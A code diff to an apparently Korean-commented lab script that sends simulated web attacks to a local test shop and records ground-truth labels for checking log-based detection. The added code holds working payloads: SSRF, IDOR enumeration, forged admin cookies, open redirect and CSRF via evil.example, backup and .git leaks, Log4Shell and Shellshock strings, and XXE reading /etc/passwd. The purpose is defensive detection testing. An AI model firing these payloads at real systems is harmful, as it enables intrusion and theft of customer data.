@@ -28,12 +28,14 @@ GOOGLEBOT_UA = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/b
 truth: list[dict] = []
 
 
-def req(url, ip, ua=BROWSER_UA, method="GET", data=None, form=None, cookie=None):
+def req(url, ip, ua=BROWSER_UA, method="GET", data=None, form=None, cookie=None, referer=None):
     """요청 한 번. 응답 코드를 돌려준다. X-Forwarded-For 로 클라이언트 IP를 흉내 낸다."""
     cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
            "-H", f"X-Forwarded-For: {ip}", "-A", ua, "-X", method]
     if cookie:
         cmd += ["-H", f"Cookie: {cookie}"]
+    if referer:
+        cmd += ["-e", referer]
     for k, v in (data or {}).items():
         cmd += ["--data-urlencode", f"{k}={v}"]
     if data and method == "GET":
@@ -228,6 +230,108 @@ def webshell_chain():
            "업로드 우회(.php 차단 → .phtml 통과) 후 cmd 파라미터로 실행")
 
 
+# ------------------------------------------------------------------ 2차: 외부 자료 기반 추가 체인
+def ssrf_internal():
+    """SSRF: 상품 이미지 가져오기 기능에 내부 주소를 넣어 내부 전용 통계(토큰 포함)를 빼낸다."""
+    ip = "198.51.100.35"
+    out = body(f"{SHOP}/fetch.php", ip, data={"url": "http://127.0.0.1:8081/internal/stats.php"})
+    record("ssrf_internal", "shopmall", ip, ["WEBLOG_SSRF"],
+           "이미지 가져오기 기능으로 내부 전용 통계 요청(SSRF)")
+    truth[-1]["verified_leak"] = "internal_token" in out
+
+
+def idor_orders():
+    """IDOR: 주문 번호를 1번부터 차례로 바꿔 가며 다른 고객의 수령인·주소·전화번호를 연다."""
+    ip = "198.51.100.36"
+    for n in range(1, 26):
+        req(f"{SHOP}/order.php", ip, data={"id": str(n)})
+    record("idor_orders", "shopmall", ip, ["WEBLOG_IDOR_ENUM"],
+           "주문 번호 1~25를 차례로 열람해 고객 정보 수집(IDOR)")
+
+
+def forged_admin():
+    """쿠키 위조: 로그인 없이 admin=1 쿠키만 붙여 관리자 회원 목록을 내려받는다."""
+    ip = "198.51.100.34"
+    out = body(f"{SHOP}/admin/members.php", ip, cookie="admin=1")
+    record("forged_admin", "shopmall", ip,
+           ["WEBLOG_ADMIN_FORGED", "WEBLOG_ADMIN_ACCESS", "WEBLOG_LARGE_EXFIL"],
+           f"로그인 없이 관리자 쿠키만 위조해 목록 {len(out):,}자 내려받기")
+
+
+def open_redirect():
+    """열린 리다이렉트: 로그인 뒤 보낼 주소를 외부 사이트로 바꿔 피싱 연결에 쓴다."""
+    ip = "198.51.100.37"
+    req(f"{SHOP}/login.php?next=http://evil.example/verify", ip, method="POST",
+        data={"username": "guest", "password": "guest"})
+    record("open_redirect", "shopmall", ip, ["WEBLOG_OPEN_REDIRECT"],
+           "로그인 뒤 외부 사이트로 보내도록 next 주소 조작")
+
+
+def csrf_admin_delete():
+    """CSRF: 관리자가 로그인된 브라우저로 외부 페이지를 열면, 그 페이지가 상품 삭제 요청을 보낸다."""
+    ip = "198.51.100.38"
+    req(f"{SHOP}/admin/delete_product.php", ip, method="POST", cookie="admin=1",
+        data={"id": "1999"}, referer="http://evil.example/prize.html")
+    record("csrf_admin_delete", "shopmall", ip, ["WEBLOG_CSRF_SUSPECT"],
+           "외부 페이지에서 관리자 상품 삭제 요청(CSRF, 피해자 브라우저)")
+
+
+def backup_leak():
+    """백업 파일 노출: 설치 때 만든 덤프 파일이 웹에 그대로 남아 있어 내려받는다."""
+    ip = "198.51.100.39"
+    out = body(f"{SHOP}/backup.sql", ip)
+    record("backup_leak", "shopmall", ip, ["WEBLOG_BACKUP_LEAK"],
+           f"남아 있던 백업 파일 내려받기({len(out):,}자, 계정 정보 포함)")
+    truth[-1]["verified_leak"] = "S3cretPass" in out
+
+
+def git_exposure():
+    """소스 노출: 배포할 때 .git 폴더가 웹 루트에 같이 올라가 설정 파일을 내려받을 수 있다."""
+    ip = "198.51.100.44"
+    out = body(f"{SHOP}/.git/config", ip)
+    record("git_exposure", "shopmall", ip, ["WEBLOG_BACKUP_LEAK"],
+           "배포 때 같이 올라간 .git 설정 파일 내려받기")
+    truth[-1]["verified_leak"] = "remote" in out
+
+
+def dir_listing():
+    """업로드 폴더 목록 공개: 폴더 주소만 열면 올라온 파일 목록이 그대로 보인다."""
+    ip = "198.51.100.40"
+    out = body(f"{SHOP}/uploads/", ip)
+    record("dir_listing", "shopmall", ip, ["WEBLOG_DIR_LISTING"],
+           "업로드 폴더 목록 열람")
+    truth[-1]["verified_leak"] = "shell.phtml" in out or "Index of" in out
+
+
+def exploit_probe():
+    """알려진 취약점 문자열을 헤더에 넣어 본다(Log4Shell 형식·Shellshock 형식).
+    이 서버는 그 취약점을 가지고 있지 않아 실행되지 않는다. 시도 자체를 잡는지 본다."""
+    ip = "198.51.100.41"
+    req(f"{SHOP}/product.php?id=2", ip, ua="${jndi:ldap://198.51.100.99/a}")
+    req(f"{SHOP}/product.php?id=2", ip, ua="() { :; }; /bin/cat /etc/passwd")
+    record("exploit_probe", "shopmall", ip, ["WEBLOG_EXPLOIT_PROBE"],
+           "Log4Shell·Shellshock 형식 문자열을 User-Agent에 넣어 시도(실행 대상 아님)")
+
+
+def xxe_import():
+    """XXE: 상품 일괄 등록 XML에 외부 파일 엔티티를 넣어 /etc/passwd를 읽는다.
+    공격 내용은 POST 본문에만 있어 접속 로그로는 보이지 않는다(사각지대)."""
+    ip = "198.51.100.43"
+    xml = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
+           '<r><product><name>&x;</name></product></r>')
+    out = _post_raw(f"{SHOP}/import.php", ip, xml)
+    record("xxe_import", "shopmall", ip, [],
+           "상품 등록 XML에 외부 파일 엔티티(XXE)로 /etc/passwd 읽기 — POST 본문이라 로그에 없음",
+           detectable=False)
+    truth[-1]["verified_leak"] = "root:" in out
+
+
+def _post_raw(url, ip, payload):
+    cmd = ["curl", "-s", "-H", f"X-Forwarded-For: {ip}", "-A", BROWSER_UA,
+           "-H", "Content-Type: application/xml", "--data-binary", payload, url]
+    return subprocess.run(cmd, capture_output=True, text=True).stdout
+
+
 def write_synthetic_authlog():
     """웹 침해가 서버 계정 탈취로 이어진 상황. auth.log 는 로컬에서 실제 SSH 공격을 돌리기
     어려워 합성한다(공격자 IP를 웹셸 시나리오와 맞춰 교차 상관만 본다)."""
@@ -265,6 +369,16 @@ def main():
     brute_login()
     default_admin_takeover()
     webshell_chain()
+    ssrf_internal()
+    idor_orders()
+    forged_admin()
+    open_redirect()
+    csrf_admin_delete()
+    backup_leak()
+    git_exposure()
+    dir_listing()
+    exploit_probe()
+    xxe_import()
     write_synthetic_authlog()
     (LAB / "logs" / "ground_truth.json").write_text(
         json.dumps({"generated_at": datetime.now(timezone.utc).isoformat(), "scenarios": truth},
